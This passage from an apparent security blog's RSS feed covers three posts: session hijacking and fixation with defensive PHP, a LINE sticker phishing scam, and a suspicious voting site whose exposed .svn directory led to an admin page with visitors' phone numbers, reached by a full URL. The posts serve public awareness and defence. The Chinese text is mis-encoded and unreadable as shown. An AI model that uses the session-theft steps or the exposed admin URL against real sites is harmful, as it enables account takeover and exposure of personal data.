&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-01-session-id-sniffing.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-01-session-id-sniffing.png&quot; alt=&quot;ç«Šå– Session ID&quot; title=&quot;ç«Šå– Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ”»æ“Šè€…ç›´æ¥ä½¿ç”¨ç«Šå–åˆ°çš„ Session ID é€è‡³ä¼ºæœå™¨ï¼Œå½é€ å—å®³è€…èº«åˆ†ã€‚è‹¥ä¼ºæœå™¨æ²’æœ‰æª¢æŸ¥ Session ID çš„ä½¿ç”¨è€…èº«åˆ†ï¼Œå‰‡å¯ä»¥è®“æ”»æ“Šè€…å¾—é€ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-02-session-id-spoofing.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-02-session-id-spoofing.png&quot; alt=&quot;å½é€  Session ID&quot; title=&quot;å½é€  Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;é˜²è­·æªæ–½&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ç¦æ­¢å°‡ Session ID ä½¿ç”¨ URL (GET) æ–¹å¼ä¾†å‚³é&lt;/li&gt;
  &lt;li&gt;è¨­å®šåŠ å¼·å®‰å…¨æ€§çš„ Cookie å±¬æ€§ï¼šHttpOnly (ç„¡æ³•è¢« JavaScript å­˜å–)&lt;/li&gt;
  &lt;li&gt;è¨­å®šåŠ å¼·å®‰å…¨æ€§çš„ Cookie å±¬æ€§ï¼šSecure (åªåœ¨ HTTPS å‚³éï¼Œè‹¥ç¶²ç«™ç„¡ HTTPS è«‹å‹¿è¨­å®š)&lt;/li&gt;
  &lt;li&gt;åœ¨éœ€è¦æ¬Šé™çš„é é¢è«‹ä½¿ç”¨è€…é‡æ–°è¼¸å…¥å¯†ç¢¼&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;session-fixation-å›ºå®š-session-id&quot;&gt;Session Fixation (å›ºå®š Session ID)&lt;/h4&gt;

&lt;p&gt;æ”»æ“Šè€…èª˜ä½¿å—å®³è€…ä½¿ç”¨ç‰¹å®šçš„ Session ID ç™»å…¥ç¶²ç«™ï¼Œè€Œæ”»æ“Šè€…å°±èƒ½å–å¾—å—å®³è€…çš„èº«åˆ†ã€‚&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;æ”»æ“Šè€…å¾ç¶²ç«™å–å¾—æœ‰æ•ˆ Session ID&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨ç¤¾äº¤å·¥ç¨‹ç­‰æ‰‹æ³•èª˜ä½¿å—å®³è€…é»é¸é€£çµï¼Œä½¿ç”¨è©² Session ID ç™»å…¥ç¶²ç«™&lt;/li&gt;
  &lt;li&gt;å—å®³è€…è¼¸å…¥å¸³è™Ÿå¯†ç¢¼æˆåŠŸç™»å…¥ç¶²ç«™&lt;/li&gt;
  &lt;li&gt;æ”»æ“Šè€…ä½¿ç”¨è©² Session IDï¼Œæ“ä½œå—å®³è€…çš„å¸³è™Ÿ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-04-session-id-fixation.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-04-session-id-fixation.png&quot; alt=&quot;Session Fixation&quot; title=&quot;Session Fixation&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;é˜²è­·æªæ–½&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;åœ¨ä½¿ç”¨è€…ç™»å…¥æˆåŠŸå¾Œï¼Œç«‹å³æ›´æ› Session IDï¼Œé˜²æ­¢æ”»æ“Šè€…æ“æ§ Session ID çµ¦äºˆå—å®³è€…ã€‚&lt;/li&gt;
  &lt;li&gt;ç¦æ­¢å°‡ Session ID ä½¿ç”¨ URL (GET) æ–¹å¼ä¾†å‚³é&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;session-é˜²è­·&quot;&gt;Session é˜²è­·&lt;/h3&gt;

&lt;p&gt;é‚£è¦æ€éº¼é˜²ç¯„æ”»æ“Šå‘¢ï¼Ÿç•¶ç„¶æœƒæœ‰äººèªªï¼Œæœƒå“¡å¡ä¸è¦æ‰ä¸å°±æ²’äº‹äº†å—ï¼Ÿç•¶ç„¶æˆ‘å€‘æ²’è¾¦æ³•ç¢ºä¿ç”¨æˆ¶ä¸æœƒå› ç‚ºå„ç¨®æ–¹å¼å°è‡´ Cookie é­ç«Šï¼ˆXSSã€æƒ¡æ„ç¨‹å¼ç­‰ï¼‰ï¼Œå› æ­¤æœ€å¾Œä¸€é“é˜²ç·šå°±æ˜¯ç¶²ç«™çš„ Session ä¿è­·ã€‚ä¸€å¼µæœƒå“¡å¡ä¸Šå¦‚æœæ²’æœ‰ä»»ä½•å¯è­˜åˆ¥çš„å€‹äººè³‡æ–™ï¼Œç•¶ç„¶ä»»ä½•äººæ’¿å»äº†éƒ½å¯ä»¥ç”¨ã€‚å¦‚æœä¸Šé¢æœ‰ç…§ç‰‡è·Ÿç°½åå‘¢ï¼Ÿå·èµ°æœƒå“¡å¡çš„äººåœ¨é€²å…¥ä¿±æ¨‚éƒ¨çš„æ™‚å€™ï¼Œåœ¨é–€å£å°±æœƒå› ç‚ºç…§ç‰‡è·Ÿæœ¬äººä¸ç¬¦è€Œè¢«æ“‹ä¸‹ä¾†ã€‚Session ä¿è­·ä¹Ÿæ˜¯ä¸€æ¨£ï¼Œæ€éº¼è®“æˆ‘å€‘çš„ Session ä¿è­·æ©Ÿåˆ¶ä¹Ÿèƒ½è¾¨è­˜èº«åˆ†å‘¢ï¼Ÿç­”æ¡ˆæ˜¯åˆ©ç”¨æ¯å€‹ä½¿ç”¨è€…ç‰¹æœ‰çš„è­˜åˆ¥è³‡è¨Šã€‚&lt;/p&gt;

&lt;p&gt;æ¯å€‹ä½¿ç”¨è€…åœ¨ç™»å…¥ç¶²ç«™çš„æ™‚å€™ï¼Œæˆ‘å€‘å¯ä»¥ç”¨æ¯å€‹äººç‰¹æœ‰çš„è­˜åˆ¥è³‡è¨Šä¾†ç¢ºèªèº«åˆ†ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ä¾†æº IP ä½å€&lt;/li&gt;
  &lt;li&gt;ç€è¦½å™¨ User-Agent&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å¦‚æœåœ¨åŒä¸€å€‹ Session ä¸­ï¼Œä½¿ç”¨è€…çš„ IP æˆ–è€… User-Agent æ”¹è®Šäº†ï¼Œæœ€å®‰å…¨çš„ä½œæ³•å°±æ˜¯æŠŠé€™å€‹ Session æ¸…é™¤ï¼Œè«‹ä½¿ç”¨è€…é‡æ–°ç™»å…¥ã€‚é›–ç„¶ä½¿ç”¨è€…å¯èƒ½å› ç‚º IP æ›´æ›ã€Proxy ç­‰å› ç´ å°è‡´è¢«å¼·åˆ¶ç™»å‡ºï¼Œä½†ç‚ºäº†å®‰å…¨æ€§ï¼Œä¾¿åˆ©æ€§å¿…é ˆè¦èˆ‡ä¹‹å–æ¨ã€‚ä»¥ PHP ç‚ºä¾‹ï¼Œæˆ‘å€‘å¯ä»¥é€™æ¨£æ’°å¯«ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;if($_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;] !== $_SESSION[&amp;#39;LAST_REMOTE_ADDR&amp;#39;] || $_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;] !== $_SESSION[&amp;#39;LAST_USER_AGENT&amp;#39;]) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   session_destroy();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;session_regenerate_id();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$_SESSION[&amp;#39;LAST_REMOTE_ADDR&amp;#39;] = $_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;];&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$_SESSION[&amp;#39;LAST_USER_AGENT&amp;#39;] = $_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;];&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;é™¤äº†æª¢æŸ¥å€‹äººè­˜åˆ¥è³‡è¨Šä¾†ç¢ºèªæ˜¯å¦ç›œç”¨ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥å¢åŠ å‰è¿°çš„ Session ID çš„é˜²è­·æ–¹å¼ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Cookie è¨­å®š Secure Flag (HTTPS)&lt;/li&gt;
  &lt;li&gt;Cookie è¨­å®š HTTP Only Flag&lt;/li&gt;
  &lt;li&gt;æˆåŠŸç™»å…¥å¾Œç«‹å³è®Šæ›´ Session ID&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Session çš„æ¸…é™¤æ©Ÿåˆ¶ä¹Ÿéå¸¸é‡è¦ã€‚ç•¶ä¼ºæœå™¨åµæ¸¬åˆ°å¯ç–‘çš„ä½¿ç”¨è€… Session è¡Œç‚ºæ™‚ï¼Œä¾‹å¦‚æ”»æ“Šè€…æƒ¡æ„å˜—è©¦å½é€  Session IDã€ä½¿ç”¨è€… Session å¯èƒ½é­ç«Šã€æˆ–è€…é€¾æ™‚ç­‰æƒ…æ³ï¼Œéƒ½æ‡‰è©²ç«‹åˆ»æ¸…é™¤è©² Session ID ä»¥å…è¢«æ”»æ“Šè€…åˆ©ç”¨ã€‚&lt;/p&gt;

&lt;p&gt;Session æ¸…é™¤æ©Ÿåˆ¶æ™‚æ©Ÿï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;åµæ¸¬åˆ°æƒ¡æ„å˜—è©¦ Session ID&lt;/li&gt;
  &lt;li&gt;è­˜åˆ¥è³‡è¨Šç„¡æ•ˆæ™‚&lt;/li&gt;
  &lt;li&gt;é€¾æ™‚&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;ç®¡ç†è€…æœ‰é¿å…ä½¿ç”¨è€…å¸³è™Ÿé­ç«Šçš„è²¬ä»»&quot;&gt;ç®¡ç†è€…æœ‰é¿å…ä½¿ç”¨è€…å¸³è™Ÿé­ç«Šçš„è²¬ä»»&lt;/h3&gt;

&lt;p&gt;ä½¿ç”¨è€…å¸³è™Ÿé­ç«Šä¸€ç›´ä»¥ä¾†éƒ½æ˜¯é¡¯è‘—çš„å•é¡Œï¼Œä½†å»é®®å°‘æœ‰ç¶²ç«™é‡å° Session çš„æ©Ÿåˆ¶é€²è¡Œä¿è­·ã€‚æ”»æ“Šè€…å¯ä»¥è¼•é¬†ä½¿ç”¨ &lt;a href=&quot;http://codebutler.github.io/firesheep/&quot;&gt;firesheep&lt;/a&gt; ä¹‹é¡çš„å·¥å…·ç«Šå–å¸³è™Ÿã€‚åœ‹å¤–å·²ç¶“æœ‰ä¸å°‘ç¶²ç«™åµæ¸¬åˆ° Session å¯èƒ½é­ç«Šæ™‚å°‡å¸³è™Ÿå¼·åˆ¶ç™»å‡ºï¼Œä½†åœ‹å…§ç›®å‰é‚„é®®å°‘ç¶²ç«™å¯¦ä½œæ­¤é˜²ç¦¦ï¼Œè¨­å‚™å•†çš„ Web ç®¡ç†ä»‹é¢æ›´å°‘é‡å° Session é€²è¡Œä¿è­·ã€‚å¦‚æœ VPN Server ç­‰è¨­å‚™æœ‰åµæ¸¬ Session ID çš„å½é€ ï¼Œåœ¨ &lt;a href=&quot;http://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; äº‹ä»¶æ™‚å°±ä¸æœƒæœ‰é‚£éº¼æ…˜é‡çš„æå¤±äº†ã€‚&lt;/p&gt;

&lt;p&gt;ç«‹åˆ»æŠŠè‡ªå·±çš„ç¶²ç«™åŠ ä¸Š Session ä¿è­·æ©Ÿåˆ¶å§ï¼&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2014/06/03/http-session-protection/</link>
                <guid>https://devco.re/blog/2014/06/03/http-session-protection</guid>
                <pubDate>Tue, 03 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>LINE å…è²»è²¼åœ–é‡£é­šè¨Šæ¯åˆ†æ</title>
                <description>&lt;p&gt;æ™šä¸Šçªç„¶æ¥åˆ°ç¤¾ç¾¤æœ‹å‹å‚³ LINE çš„è¨Šæ¯éä¾†ï¼Œå®šç›ä¸€çœ‹ä¸¦ä¸å–®ç´”ã€‚é€™ç¶²å€çœ‹èµ·ä¾†å°±æ˜¯é‡£é­šç¶²ç«™å•Šï¼Ÿæ€éº¼æœƒé€™æ¨£å‘¢ï¼Ÿé›£é“æ˜¯æœ‹å‹åœ¨æ¸¬è©¦æˆ‘å€‘çš„è­¦è¦ºå¿ƒå¤ ä¸å¤ å—ï¼Ÿè®“æˆ‘å€‘çœ‹ä¸‹å»é€™å€‹é‡£é­šç¶²é æ€éº¼ç©ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_01.png&quot; alt=&quot;LINE å‚³é€è´ˆé€è²¼åœ–è¨Šæ¯é‡£é­š&quot; title=&quot;LINE å‚³é€è´ˆé€è²¼åœ–è¨Šæ¯é‡£é­š&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;æ­¤ LINE é‡£é­šè¨Šæ¯èªªåªè¦å¹«å¿™è½‰ç™¼ 15 æ¬¡è¨Šæ¯ï¼Œå°±æœƒè´ˆé€è²¼åœ–ã€‚å…ˆä¸è«– LINE æœ‰æ²’æœ‰é€™æ¨£çš„æ©Ÿåˆ¶ï¼Œæˆ‘å€‘å…ˆç›´æ¥é»é¸é€£çµçœ‹çœ‹è‘«è˜†è£¡è³£ä»€éº¼è—¥ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_02.png&quot; alt=&quot;LINE é‡£é­šå‡è²¼åœ–ç¶²é &quot; title=&quot;LINE é‡£é­šå‡è²¼åœ–ç¶²é &quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ç€è¦½å™¨æ‰“é–‹ä¹‹å¾Œï¼Œè·³å‡ºäº†é ˜å–è²¼åœ–çš„ã€Œç¶²é ã€ï¼Œè€Œä¸”é‚„æœ‰è©­ç•°çš„ç´…å­—ã€‚å„ç¨®è·¡è±¡éƒ½è·Ÿä¸€èˆ¬é ˜å–è²¼åœ–çš„æ¨¡å¼ä¸åŒï¼Œå¤ªä»¤äººèµ·ç–‘äº†ã€‚é»äº†åœ–å°±æœƒè·³åˆ° Facebook ç™»å…¥é é¢ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_03.png&quot; alt=&quot;å‡ Facebook ç™»å…¥é é¢é¨™å–å¸³è™Ÿå¯†ç¢¼&quot; title=&quot;å‡ Facebook ç™»å…¥é é¢é¨™å–å¸³è™Ÿå¯†ç¢¼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ˜çœ¼äººçœ‹åˆ°é€™å€‹ Facebook ç™»å…¥é é¢å°±æœƒç™¼ç¾å¤ªå‡äº†ï¼Œç ´ç¶»å¤šå¤šã€‚Logoã€ç¶²å€ã€ç¶²é æ ¼å¼ç ´æ¿ã€ç°¡é«”å­—ï¼Œå¤ªå¤šä»¤äººæ‡·ç–‘çš„åœ°æ–¹äº†ã€‚åœ¨é€™é‚Šæˆ‘å€‘åªè¦éš¨ä¾¿è¼¸å…¥å¸³è™Ÿè·Ÿå¯†ç¢¼ï¼Œå°±èƒ½åˆ°ä¸‹å€‹ç•«é¢ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_04.png&quot; alt=&quot;å‡ Facebook ç™»å…¥å®Œæˆé é¢&quot; title=&quot;å‡ Facebook ç™»å…¥å®Œæˆé é¢&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;çµæœç•¶ç„¶æ˜¯ä¸æœƒçµ¦ä½ è²¼åœ–å•¦ï¼è€Œä¸”ç¶²å€ã€Œcuowuã€æ˜¯ã€ŒéŒ¯èª¤ã€çš„æ‹¼éŸ³ï¼Œä¹Ÿæš´éœ²äº†ç¶²ç«™ä½œè€…çš„èº«åˆ†ã€‚ç›´æ¥ç”¨ç€è¦½å™¨çœ‹å‚³éçš„é é¢å«åšã€Œtj.aspã€ï¼Œã€Œtjã€æ­£å¥½æ˜¯ã€Œæäº¤ã€ï¼Œç•«é¢ä¸Šçš„éŒ¯èª¤è¨Šæ¯æ›´æ˜¯å¤§å‰Œå‰Œçš„ç›´æ¥ç§€å‡ºç°¡é«”å­—ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_05.png&quot; alt=&quot;é‡£é­šç¶²ç«™ç¶²é è¨Šæ¯&quot; title=&quot;é‡£é­šç¶²ç«™ç¶²é è¨Šæ¯&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;äº‹å¾Œå‹äººç›´æ¥èªª LINE å¸³è™Ÿè¢«ç›œç”¨ç™¼è¨Šæ¯äº†ï¼Œè€Œä¸”å¯†ç¢¼å¯èƒ½éæ–¼ç°¡å–®ã€ä¹Ÿæ²’æœ‰è¨­å®šæ›æ©Ÿå¯†ç¢¼ã€‚å› æ­¤åœ¨é€™é‚Šå‘¼ç±²å¤§å®¶åšå¥½ LINE çš„å®‰å…¨è¨­å®šï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;åŠ å¼·å¯†ç¢¼é•·åº¦ã€è¤‡é›œåº¦&lt;/li&gt;
  &lt;li&gt;è¨­å®šã€Œæ›æ©Ÿå¯†ç¢¼ã€&lt;/li&gt;
  &lt;li&gt;è‹¥åªåœ¨æ‰‹æ©Ÿä½¿ç”¨ LINEï¼Œå¯å°‡ã€Œå…è¨±è‡ªå…¶ä»–è£ç½®ç™»å…¥ã€é—œé–‰&lt;/li&gt;
  &lt;li&gt;å¦‚æœæœ‰å¸³è™Ÿè¢«ç›œç‹€æ³ï¼Œè¶•å¿«è¯çµ¡ LINE &lt;a href=&quot;https://line.naver.jp/cs/&quot;&gt;https://line.naver.jp/cs/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å¤§å®¶åœ¨äº«å—é€šè¨Šè»Ÿé«”èˆ‡æœ‹å‹å‚³è¨Šè²¼åœ–çš„åŒæ™‚ï¼Œä¹Ÿå¿…é ˆè¦æ³¨æ„æœ‰å¿ƒäººå£«åˆ©ç”¨é€™äº›ç®¡é“ç«Šå–ä½ çš„å¸³è™Ÿå¯†ç¢¼å–”ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/05/12/line-phishing/</link>
                <guid>https://devco.re/blog/2014/05/12/line-phishing</guid>
                <pubDate>Mon, 12 May 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>æ¶æ­æ ¸å››èˆ‡æœè²¿ç†±æ½®çš„æ½›åœ¨è©é¨™ç¶²ç«™</title>
                <description>&lt;h3 id=&quot;votetwam&quot;&gt;vote.tw.am&lt;/h3&gt;

&lt;p&gt;æœ€è¿‘å¾ˆå¤šäººéƒ½æ”¶åˆ°äº†ä¸€å€‹çœ‹èµ·ä¾†å¾ˆåƒé‡£é­šç¶²ç«™çš„æ ¸å››æŠ•ç¥¨ç«™å°ç°¡è¨Šï¼Œå¦‚ä¸‹åœ–ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/1.vote.tw.am.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/1.vote.tw.am.jpg&quot; alt=&quot;æ ¸å››æŠ•ç¥¨ç«™å°ç°¡è¨Š&quot; title=&quot;æ ¸å››æŠ•ç¥¨ç«™å°ç°¡è¨Š&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘ä¹Ÿæ”¶åˆ°äº†ï¼Œä½†æ˜¯å‰›åƒé£½é£¯å¯¦åœ¨å¾ˆæƒ³ç¡è¦ºï¼Œä¸å¤ªæƒ³ç†ä»–ï¼Œæ–¼æ˜¯å°±å¿ä¸ä½è¶´ä¸‹ç¡è¦ºï¼Œç«Ÿç„¶åšäº†å€‹å¤¢â€¦..&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ç«™å°å…§å®¹&quot;&gt;ç«™å°å…§å®¹&lt;/h3&gt;

&lt;p&gt;åœ¨å¤¢ä¸­æ‰‹æ»‘æ‰“é–‹äº†ç¶²é ï¼Œå…§å®¹é•·å¾—åƒé€™å€‹æ¨£å­ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/2.vote.tw.am_votepage.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/2.vote.tw.am_votepage.png&quot; alt=&quot;æ ¸å››æŠ•ç¥¨ç«™å°é é¢&quot; title=&quot;æ ¸å››æŠ•ç¥¨ç«™å°é é¢&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;çœ‹äº†çœŸæ˜¯éå¸¸çš„ç¾©æ†¤å¡«è†ºï¼é¦¬ä¸Šå°±æƒ³æŠ•ä¸‹ç¥è–çš„ä¸€ç¥¨ï¼ä½†æ˜¯å¿½ç„¶è½åˆ°å‘¨å…¬æŒ‡ç¤ºèªªç¶²ç«™åº•ä¸‹æœ‰å¥‡æ€ªçš„ç›®éŒ„ï¼Œç…§è‘—ç¥è«­ä¸€è©¦ï¼Œç™¼ç¾æœ‰ .svn ç›®éŒ„è·Ÿ entries æª”ï¼&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/3.svn_entries.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/3.svn_entries.png&quot; alt=&quot;.svn ç›®éŒ„&quot; title=&quot;.svn ç›®éŒ„&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;é€™æ™‚å€™ä¸‰å¤ªå­å“ªå’å‰›å¥½è·¯éï¼Œèªªä»–å‰›å‰›åœ¨ Pastebin çœ‹åˆ°æœ‰äººè²¼äº†&lt;a href=&quot;http://pastebin.com/4iEVWh24&quot;&gt;ä¸€ç¯‡è·Ÿé€™å€‹ç¶²ç«™å¥½åƒæœ‰é—œè¯çš„å…§å®¹&lt;/a&gt;ï¼Œè¬›å®Œä»–å°±é–‹è‘—æ°´è»Šè·‘å»é®å£“é¾å®®äº†ã€‚é»é–‹é‚£ç¯‡å…§å®¹ä¸€çœ‹ï¼Œå…§å®¹æœ‰ä¸€äº›å¾ˆå¥‡æ€ªçš„ç¶²å€ï¼Œè®“äººçœ‹äº†å°±å¾ˆæƒ³é»ï¼éš¨ä¾¿é¸äº†ä¸€å€‹ http://vote.tw.am/2N9E6V4E5R4BABC0647469FF213F2D94A27FA/chose_vote.include.php æ‰“é–‹ä¾†çœ‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/4.vote.tw.am_homepage.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/4.vote.tw.am_homepage.png&quot; alt=&quot;æŠ•ç¥¨é …ç›®&quot; title=&quot;æŠ•ç¥¨é …ç›®&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å“‡å¡ï¼åŸä¾†å¾æœè²¿å°±å·²ç¶“é–‹å§‹äº†å‘¢ï¼è®“æˆ‘å€‘ç¹¼çºŒé»é€²å»çœ‹çœ‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/5.vote.tw.am_navigation.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/5.vote.tw.am_navigation.png&quot; alt=&quot;æŠ•ç¥¨çµæœå°è¦½é é¢&quot; title=&quot;æŠ•ç¥¨çµæœå°è¦½é é¢&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;çœ‹èµ·ä¾†æ˜¯å€‹å¾Œå°ï¼Œå¯ä»¥ç€è¦½ä½¿ç”¨è€…çš„æŠ•ç¥¨è¨˜éŒ„ã€ç•™è¨€ç­‰è³‡æ–™ï¼Œé‚£å°±é»å€‹æŠ•ç¥¨è¨˜éŒ„ä¾†çœ‹çœ‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/6.vote.tw.am_vote_record.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/6.vote.tw.am_vote_record.png&quot; alt=&quot;æŠ•ç¥¨è¨˜éŒ„&quot; title=&quot;æŠ•ç¥¨è¨˜éŒ„&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æœç„¶è£¡é¢å­˜è‘—çœ¾å¤šæ°‘çœ¾çš„æŠ•ç¥¨è¨˜éŒ„ï¼Œé‚£éº¼ç”¨æˆ¶åé¥‹æ‡‰è©²å°±æ˜¯ç•™è¨€äº†â€¦&lt;/p&gt;

&lt;p&gt;å¾é€™äº›å…§å®¹çœ‹ä¾†ï¼Œæ‡‰è©²æ˜¯æœ‰å€‹é›†åœ˜æ“æœ‰å¤§é‡çš„æ°‘çœ¾å€‹è³‡ï¼Œä¸¦ä¸”ä¸€ä¸€ç™¼é€è¨Šæ¯çµ¦é€™äº›äººï¼ŒèƒŒå¾Œç›®çš„å°šä¸å¾—è€ŒçŸ¥ã€‚æœ‰å¯èƒ½æ˜¯å¤§é™¸äººæƒ³åˆ©ç”¨é€™å€‹ç†±æ½®ç¢ºèªé€™äº›é›»è©±è™Ÿç¢¼æ˜¯å¦çœŸå¯¦ã€å¯ç”¨ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ä¸çŸ¥åçš„é»‘æ‰‹æ­£åœ¨ç­–åŠƒä¸‹ä¸€å€‹æ‰“å£“å‹•ä½œï¼Ÿæ­£ç•¶æˆ‘å€‘æƒ³ææ¸…æ¥šå°æ–¹ç©¶ç«Ÿæ˜¯é€éé›»è©±è™Ÿç¢¼é‚„æ˜¯ä¿¡ç®±å‚³é€ iMessage æ™‚ï¼Œå“ªå’å¿½ç„¶åˆè·¯éäº†ï¼Œä¸Ÿäº†é€™å¼µåœ–ä¹‹å¾Œå«æˆ‘å€‘ä¸è¦å†çå¿™äº†è¶•å¿«å›å®¶æ´—æ´—ç¡ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/7.scam.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/7.scam.png&quot; alt=&quot;IPã€æ™‚é–“ã€é›»è©±ã€å›æ‡‰å…§å®¹ç­‰è³‡æ–™&quot; title=&quot;IPã€æ™‚é–“ã€é›»è©±ã€å›æ‡‰å…§å®¹ç­‰è³‡æ–™&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æœç„¶æœ‰é›»è©±ï¼ç©¶ç«Ÿé€™ä»¶äº‹ï¼Œæ˜¯æœ‰ç¶²ç«™å¤§é‡æ´©æ¼å€‹è³‡ï¼Œé‚„æ˜¯æœ‰äººåœ¨æ°‘é‹æœŸé–“åˆ©ç”¨é€™è‚¡ç†±æ½®è’é›†å€‹è³‡ï¼ŒæŠ‘æˆ–æ˜¯èƒŒå¾Œæœ‰ä»€éº¼ä¸å¯å‘Šäººçš„ç§˜å¯†å‘¢ï¼Ÿè®“æˆ‘å€‘ç¹¼çºŒçœ‹ä¸‹å»ï½&lt;/p&gt;

&lt;h3 id=&quot;å¤¢é†’æ™‚åˆ†&quot;&gt;å¤¢é†’æ™‚åˆ†&lt;/h3&gt;

&lt;p&gt;ä¸Šç­æ™‚é–“ä¸èƒ½åˆç¡å¤ªä¹…ï¼Œæ–¼æ˜¯å‘¨å…¬å°±æŠŠæˆ‘å€‘å«é†’äº†â€¦..&lt;/p&gt;

&lt;p&gt;å°æ–¼é€™æ¨£çš„å¤¢å¢ƒæˆ‘å€‘æœ‰ä»¥ä¸‹å»ºè­°ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ä¸è¦éš¨æ„é»æ“Šä¾†è·¯ä¸æ˜çš„ç°¡è¨Šå…§å®¹&lt;/li&gt;
  &lt;li&gt;åœ¨ç¶²è·¯ä¸Šå¡«å¯«ä»»ä½•å…§å®¹ä¹‹å‰å…ˆæŸ¥è­‰è©²ç¶²ç«™æ˜¯å¦å¯ç–‘&lt;/li&gt;
